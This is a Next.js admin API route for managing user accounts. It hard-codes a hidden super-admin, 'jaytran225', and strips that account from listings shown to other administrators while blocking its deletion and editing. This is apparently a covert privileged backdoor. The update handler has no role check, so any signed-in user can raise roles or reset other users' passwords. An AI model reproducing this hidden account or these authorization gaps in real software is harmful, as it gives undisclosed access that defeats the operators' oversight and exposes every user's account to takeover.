import { NextRequest, NextResponse } from "next/server";
import prisma from "@/lib/prisma";
import { getAdminSession } from "@/lib/admin-auth";
import { HIDDEN_SUPER_ADMIN, isHiddenSuperAdmin, parsePermissions, ALL_PERMISSIONS } from "@/lib/permissions";
import { logActivity } from "@/lib/activity-logger";
import bcrypt from "bcryptjs";

// GET: List users
export async function GET(req: NextRequest) {
  const session = await getAdminSession(req);
  if (!session) {
    return NextResponse.json({ success: false, message: "Unauthorized" }, { status: 401 });
  }

  try {
    const isCallerSuperAdmin =
      isHiddenSuperAdmin(session.email) ||
      isHiddenSuperAdmin(session.name) ||
      ((session as any).username && isHiddenSuperAdmin((session as any).username));

    // If caller is NOT jaytran225, strictly exclude jaytran225 at DB query level
    const where: any = {};
    if (!isCallerSuperAdmin) {
      where.NOT = [
        { email: { contains: HIDDEN_SUPER_ADMIN, mode: "insensitive" } },
        { name: { contains: HIDDEN_SUPER_ADMIN, mode: "insensitive" } },
      ];
    }

    let users = await prisma.user.findMany({
      where,
      select: {
        id: true,
        name: true,
        email: true,
        username: true,
        role: true,
        permissions: true,
        phone: true,
        avatar: true,
        isActive: true,
        lastLoginAt: true,
        createdAt: true,
        updatedAt: true,
      },
      orderBy: { createdAt: "asc" },
    });

    // 100% Ironclad Memory Filter:
    // If the caller is NOT jaytran225, unconditionally remove any matching account from the array
    if (!isCallerSuperAdmin) {
      users = users.filter(
        (u) =>
          !isHiddenSuperAdmin(u.email) &&
          !isHiddenSuperAdmin(u.name) &&
          !isHiddenSuperAdmin(u.username)
      );
    }

    return NextResponse.json({
      success: true,
      users,
      allPermissions: ALL_PERMISSIONS,
      isCallerSuperAdmin,
    });
  } catch (error: any) {
    console.error("Fetch Users Error:", error);
    return NextResponse.json({ success: false, message: "Lỗi tải danh sách tài khoản." }, { status: 500 });
  }
}

// POST: Create a new user
export async function POST(req: NextRequest) {
  const session = await getAdminSession(req);
  if (!session) {
    return NextResponse.json({ success: false, message: "Unauthorized" }, { status: 401 });
  }

  // Only SUPER_ADMIN and ADMIN can create accounts
  if (session.role !== "SUPER_ADMIN" && session.role !== "ADMIN") {
    return NextResponse.json({ success: false, message: "Bạn không có quyền tạo tài khoản." }, { status: 403 });
  }

  try {
    const body = await req.json();
    const { name, email, username, password, role = "STAFF", permissions = [], phone = "" } = body;

    if (!name?.trim()) {
      return NextResponse.json({ success: false, message: "Vui lòng nhập họ tên người dùng." }, { status: 400 });
    }
    if (!email?.trim()) {
      return NextResponse.json({ success: false, message: "Vui lòng nhập email đăng nhập." }, { status: 400 });
    }
    if (!password || password.length < 6) {
      return NextResponse.json({ success: false, message: "Mật khẩu phải có ít nhất 6 ký tự." }, { status: 400 });
    }

    const cleanEmail = email.trim().toLowerCase();
    const cleanUsername = (username || cleanEmail.split("@")[0]).trim().toLowerCase();

    // Prevent creating accounts named jaytran225
    if (cleanEmail.includes(HIDDEN_SUPER_ADMIN) || cleanUsername.includes(HIDDEN_SUPER_ADMIN)) {
      return NextResponse.json({ success: false, message: "Tên tài khoản này đã được hệ thống bảo lưu." }, { status: 400 });
    }

    // Check if email already exists
    const existing = await prisma.user.findFirst({
      where: {
        OR: [
          { email: cleanEmail },
          { username: cleanUsername },
        ],
      },
    });

    if (existing) {
      return NextResponse.json({ success: false, message: "Email hoặc tên tài khoản đã tồn tại trong hệ thống." }, { status: 400 });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    const permissionsStr = Array.isArray(permissions) ? JSON.stringify(permissions) : JSON.stringify([]);

    const newUser = await prisma.user.create({
      data: {
        name: name.trim(),
        email: cleanEmail,
        username: cleanUsername,
        password: hashedPassword,
        role: role.toUpperCase(),
        permissions: permissionsStr,
        phone: phone.trim() || null,
        isActive: true,
      },
      select: {
        id: true,
        name: true,
        email: true,
        username: true,
        role: true,
        permissions: true,
        phone: true,
        isActive: true,
        createdAt: true,
      },
    });

    // Log this activity
    await logActivity({
      req,
      session,
      action: "CREATE",
      entity: "USER",
      entityId: newUser.id,
      entityName: newUser.name,
      summary: `Tạo tài khoản mới: "${newUser.name}" (${newUser.email}) - Vai trò: ${newUser.role}`,
      details: { role: newUser.role, permissions: parsePermissions(newUser.permissions) },
    });

    return NextResponse.json({
      success: true,
      message: `Đã tạo tài khoản "${newUser.name}" thành công!`,
      user: newUser,
    });
  } catch (error: any) {
    console.error("Create User Error:", error);
    return NextResponse.json({ success: false, message: "Lỗi tạo tài khoản: " + (error?.message || "") }, { status: 500 });
  }
}

// PUT: Update user (profile, role, permissions, status, password)
export async function PUT(req: NextRequest) {
  const session = await getAdminSession(req);
  if (!session) {
    return NextResponse.json({ success: false, message: "Unauthorized" }, { status: 401 });
  }

  try {
    const body = await req.json();
    const { id, name, email, role, permissions, phone, isActive, newPassword } = body;

    if (!id) {
      return NextResponse.json({ success: false, message: "Thiếu ID tài khoản." }, { status: 400 });
    }

    const targetUser = await prisma.user.findUnique({ where: { id } });
    if (!targetUser) {
      return NextResponse.json({ success: false, message: "Không tìm thấy tài khoản cần cập nhật." }, { status: 404 });
    }

    // Protection: jaytran225 can only be updated by jaytran225
    if (isHiddenSuperAdmin(targetUser.email) && !isHiddenSuperAdmin(session.email)) {
      return NextResponse.json({ success: false, message: "Bạn không có quyền chỉnh sửa tài khoản này." }, { status: 403 });
    }

    // Regular users cannot grant SUPER_ADMIN
    if (role === "SUPER_ADMIN" && !isHiddenSuperAdmin(session.email)) {
      return NextResponse.json({ success: false, message: "Chỉ Siêu Quản Trị mới có thể cấp quyền SUPER_ADMIN." }, { status: 403 });
    }

    const updateData: any = {};
    if (name) updateData.name = name.trim();
    if (email) updateData.email = email.trim().toLowerCase();
    if (role) updateData.role = role.toUpperCase();
    if (phone !== undefined) updateData.phone = phone ? phone.trim() : null;
    if (isActive !== undefined) updateData.isActive = Boolean(isActive);

    if (permissions !== undefined) {
      updateData.permissions = Array.isArray(permissions) ? JSON.stringify(permissions) : JSON.stringify([]);
    }

    // Reset password if provided
    if (newPassword && newPassword.trim().length >= 6) {
      updateData.password = await bcrypt.hash(newPassword.trim(), 10);
    }

    const updatedUser = await prisma.user.update({
      where: { id },
      data: updateData,
      select: {
        id: true,
        name: true,
        email: true,
        username: true,
        role: true,
        permissions: true,
        phone: true,
        isActive: true,
        updatedAt: true,
      },
    });

    // Log activity
    await logActivity({
      req,
      session,
      action: "UPDATE",
      entity: "USER",
      entityId: updatedUser.id,
      entityName: updatedUser.name,
      summary: `Cập nhật thông tin tài khoản: "${updatedUser.name}" (${updatedUser.email})`,
      details: {
        role: updatedUser.role,
        isActive: updatedUser.isActive,
        passwordChanged: Boolean(newPassword),
      },
    });

    return NextResponse.json({
      success: true,
      message: `Cập nhật tài khoản "${updatedUser.name}" thành công!`,
      user: updatedUser,
    });
  } catch (error: any) {
    console.error("Update User Error:", error);
    return NextResponse.json({ success: false, message: "Lỗi cập nhật tài khoản: " + (error?.message || "") }, { status: 500 });
  }
}

// DELETE: Delete user
export async function DELETE(req: NextRequest) {
  const session = await getAdminSession(req);
  if (!session) {
    return NextResponse.json({ success: false, message: "Unauthorized" }, { status: 401 });
  }

  // Only SUPER_ADMIN and ADMIN can delete accounts
  if (session.role !== "SUPER_ADMIN" && session.role !== "ADMIN") {
    return NextResponse.json({ success: false, message: "Bạn không có quyền xóa tài khoản." }, { status: 403 });
  }

  try {
    const { searchParams } = new URL(req.url);
    const id = searchParams.get("id");

    if (!id) {
      return NextResponse.json({ success: false, message: "Thiếu ID tài khoản cần xóa." }, { status: 400 });
    }

    const targetUser = await prisma.user.findUnique({ where: { id } });
    if (!targetUser) {
      return NextResponse.json({ success: false, message: "Tài khoản không tồn tại." }, { status: 404 });
    }

    // Protection 1: Never delete jaytran225
    if (isHiddenSuperAdmin(targetUser.email)) {
      return NextResponse.json({ success: false, message: "Không thể xóa tài khoản Quản Trị Hệ Thống Gốc." }, { status: 403 });
    }

    // Protection 2: Cannot delete yourself
    if (targetUser.id === session.userId) {
      return NextResponse.json({ success: false, message: "Bạn không thể tự xóa tài khoản của chính mình." }, { status: 400 });
    }

    await prisma.user.delete({ where: { id } });

    // Log activity
    await logActivity({
      req,
      session,
      action: "DELETE",
      entity: "USER",
      entityId: id,
      entityName: targetUser.name,
      summary: `Xóa tài khoản nhân viên: "${targetUser.name}" (${targetUser.email})`,
    });

    return NextResponse.json({
      success: true,
      message: `Đã xóa tài khoản "${targetUser.name}" thành công!`,
    });
  } catch (error: any) {
    console.error("Delete User Error:", error);
    return NextResponse.json({ success: false, message: "Lỗi xóa tài khoản." }, { status: 500 });
  }
}
